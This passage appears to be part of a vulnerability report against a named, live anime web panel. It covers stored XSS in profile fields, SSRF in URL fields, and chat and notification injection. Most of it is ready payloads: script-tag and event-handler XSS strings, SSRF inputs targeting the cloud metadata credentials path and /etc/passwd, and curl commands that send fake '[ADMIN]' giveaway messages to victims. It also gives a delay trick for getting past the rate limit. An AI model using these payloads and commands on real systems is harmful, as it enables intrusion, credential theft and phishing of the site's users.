## 5. Stored XSS via Profile Fields

### Vulnerable Fields
- `username`
- `equippedBadge`
- `banner`

# EXECUTION TRACE
```json
{"username": "<img src=x onerror=alert(1)>"}
{"equippedBadge": "<script>alert(1)</script>"}
{"banner": "<svg onload=alert(1)>"}
```

# BLAST RADIUS
- Server stores without sanitization
- Self-view renders XSS payloads
- Cross-user IDOR view strips non-image URLs
- If Android app WebView renders these → stored XSS on device

---

## 6. SSRF via Profile Fields

### Vulnerable Fields
- `photoURL` — accepts `http://169.254.169.254/`, `file:///etc/passwd`, `http://127.0.0.1:3000`
- `banner` — same

# EXECUTION TRACE
```json
{"photoUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"banner": "http://127.0.0.1:3000/admin"}
```

# BLAST RADIUS
- If server fetches these URLs → server-side SSRF
- If app renders them → client-side SSRF (metadata theft on Android)
- No URL scheme validation, no internal IP blocking

---

## 7. Chat & Notification Injection

### Chat Injection
```bash
curl -X POST https://panel.mikunime.web.id/api/miku/7/9/chat/send \
  -H "Authorization: Bearer {token}" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"message":"[ADMIN] Premium giveaway!","chatType":"global","from_name":"Yanzz X MikuNime"}'
```

### Notification Injection
```bash
curl -X POST https://panel.mikunime.web.id/api/miku/7/9/notifications/chat-message \
  -H "Authorization: Bearer {token}" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"to_uid":"{victim_uid}","from_name":"Yanzz X MikuNime","message":"You won premium!"}'
```

### Rate Limit
- 429 after ~3 rapid requests
- Bypass with 4-second delay

